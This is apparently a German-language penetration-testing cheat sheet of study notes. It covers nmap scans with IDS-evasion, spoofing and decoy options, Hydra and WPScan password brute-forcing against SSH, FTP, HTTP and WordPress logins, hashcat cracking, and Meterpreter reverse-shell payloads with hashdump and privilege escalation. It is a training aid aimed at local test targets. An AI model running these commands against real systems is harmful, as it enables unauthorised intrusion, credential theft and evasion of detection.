# Cheatsheets and Links:

- https://gabb4r.gitbook.io/oscp-notes (General Cheatsheet organized by ports; Windows & Linux)
- https://www.noobsec.net/oscp-cheatsheet/ (General Cheatsheet organized by ports; Windows & Linux)
- https://gtfobins.github.io/ (Privesc)
- https://hacktools.sh/ (Revshells and Linux commands; Browserextension)
- https://www.revshells.com/ (More Revshells)
- https://osintframework.com/ (OSINT)
# Information Gathering

---

## Scans:

### Nmap

#### Standard Scans:

Aggressive:

```bash
sudo nmap -A 127.0.0.1 -v
```

(Erzeugt sehr viel Traffic)

TCP Scan:

```bash
sudo nmap -sT 127.0.0.1 -v
```

(Normaler TCP scan -> Verbindung wird nach 3-way handshake beendet (Dadurch erkennbar))

SYN (Standard nmap scan):

```bash
nmap -sS -F 127.0.0.1 -v
```

(Schnell aber nicht umbedingt präzise dafür unwahrscheinlicher geloggt zu werden -> Verbindung wird während 3-way handshake beendet)

UDP:

```bash
nmap -sU -F 127.0.0.1 -v
```

(Aufgrund von keiner Antwort vom Server kann der Scan nur rausfinden ob der Port offen ist oder ob der Port von der Firewall geblockt wird) -> Dauert recht lange also nicht so optimal

Ping:

```bash
nmap -sn 127.0.0.1 -v
```

(Ping scan)

Version scan:

```bash
nmap -sV 127.0.0.1 -v
```

(Macht einen SYN scan und gibt Versionshinweise zu den Services)


IDS umgehen:

```bash
nmap -T2 -f 127.0.0.1
```

(Das T-flag kann auch bis 0 runtergestuft werden um noch langsamer Pakete zu schicken)


Script scan:

```bash
nmap -sC 127.0.0.1 -v
```

(Führt einen SYN scan durch mit praktischen Scripts)

Vulnerability scan:

```bash
nmap --script vuln 127.0.0.1 -v
```
#### Advanced Scans:
(Häufig bei besonderen Systemen)

Null/FIN/XMAS scan:

```bash
nmap -sN 127.0.0.1 -v

nmap -sF 127.0.0.1 -v

nmap -sX 127.0.0.1 -v
```

(Setzen unterschiedliche Flags und bekommen nur Antwort, wenn der Port geschlossen ist )

ACK:

```bash
nmap -sA -F 127.0.0.1 -v
```

(Firewall Regeln erkennen)


Firewall erkennen:

```bash
nmap --badsum 127.0.0.1
```

Mac spoofing (Anonymisiert scan):

```bash
nmap --spoof-mac 00:11:22:33:44:55 127.0.0.1
```

(Muss im gleichen Ethernet/Wifi sein)


IP spoofing:

```bash
sudo nmap -e NETWORK_INTERFACE -Pn -S 127.0.0.2 127.0.0.1
```

(Sendet einen Nmap Scan an 127.0.0.1 und response an 127.0.02 (Network traffic muss überwacht werden können)) -> Umgeht evtl. Firewalls


Decoy scan:
```bash
sudo nmap -D 127.0.0.1,127.0.0.2,ME,RND,127.0.0.3
```

(Schickt nmap scan von ganz vielen IPs -> Angreifer geht unter)


Zombie scan:
```bash
sudo nmap -sI ZOMBIE_IP 127.0.0.1
```

(Scan von einem Drucker (ZOMBIE_IP) um unentdeckt zu bleiben)

Nmap flags:
```bash
-F # Fast Mode (scannt 100 most common ports)
-p- # Alle ports
-r # Scannt die ports in "consecutive order"
-T<0-5> # Geschwindigkeit beim port scannen
--min-parallelism=64 # Wie viele Instanzen gleichzeitig laufen
-f # Schickt Scan fragmentiert
-sV
```

### Gobuster

Gobuster scan:

```bash
gobuster dir -u 127.0.0.1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

### Exiftools

Metadaten auslesen:

```bash
exiftool picture.png
```

Binwalk (Binary Daten exportieren):

```bash
binwalk -e picture.png
```

### Sonstiges:

whois -> DNS records
nslookup -> IP Adressen/Mailserver/TXT für DNS
dig -> Krasseres nslookup
DNSDumpster -> Findet Subdomains
Shodan.io -> DNS

# Exploiting

---

## Bruteforce/Dictionary:

### Hydra

SSH:

```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt 127.0.0.1 ssh -t 4 -V
```

Mit 4 Threads

FTP:

```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt ftp://127.0.0.1 -V
```

HTTP:

```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt 127.0.0.1 http-post-form "/login:username=^USER^&password=^PASS^:Invalid Password!" -V
```

Generell:
```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt 127.0.0.1 service
```
(service = ftp, pop3, imap, smtp, ssh, http)

Paar Flags:  
 -f : Stoppt wenn PW gefunden  
\-s : Port
Großschreibung von -L und -P : Bruteforcen mit einer Wörterliste
Kleinschreibung von -l und -p : Konkreter Wert

### WP Scan
WP scan kann nicht nur zum scannen benutzt werden sondern auch zum Bruteforcen:

```bash
wpscan --url http://127.0.0.1/ --passwords /usr/share/wordlists/rockyou.txt
```
(Probiert admin, editor und author)

Wenn man einen User hat:
```bash
wpscan --url http://127.0.0.1/ --username bruno --passwords /usr/share/wordlists/rockyou.txt
```

(--usernames -> Wörterliste mit Usern)
### Crunch

Generiert Bruteforce Wordlists:

crunch min max charset

```
crunch 1 3 0123456789!()/$%& -o wordlist.txt
```

### CeWL

Generiert Wordlists von Webseiten Content

```
cewl http://127.0.0.1 -w output.txt
```

Flasgs:

- \-m Min Password length -x Max Password length
- \-d Depth of spider (Wie viele Unterseiten sich angeschaut werden)
- \-a Wenn hinter login
- \--with-numbers fügt Nummern hinzu

### Hashcat

SHA256

```bash
hashcat -a 0 -w 4 -m 1400 --session hash_session hash.hash /usr/share/wordlists/rockyou.txt
```

## Reverse Shells

### Meterpreter:
Meterpreter listener:
```bash
use exploit/multi/handler
```

Payload setzen:
```bash
set PAYLOAD windows/meterpreter/reverse_tcp

set PAYLOAD linux/meterpreter/reverse_tcp
```

Commands:
```bash
getuid # Whoami (Ist man system)

shell # Reverseshell

upload/download # Dateien hoch und runterladen

getsystem # Priv escalation

hashdump # Hashes von Windows extrahieren
```

## RDP
```bash
xfreerdp3 /v:192.168.0.1 /u:Administrator /p:Passwort1234
```

Paar Optionen:
- `size:1920x1080` – Bildschirmauflösung anpassen
- `/f` – Vollbildmodus
- `+clipboard` – Zwischenablage zwischen Client und Server aktivieren
- `/drive:<Name>,<Pfad>` – Lokale Verzeichnisse auf dem Remote-System verfügbar machen
- `/cert:ignore` – Zertifikatsprüfungen ignorieren (bei SSL-Fehlern nützlich)


https://nextcloud.th-deg.de/s/SQDEmHeXEX2HPoD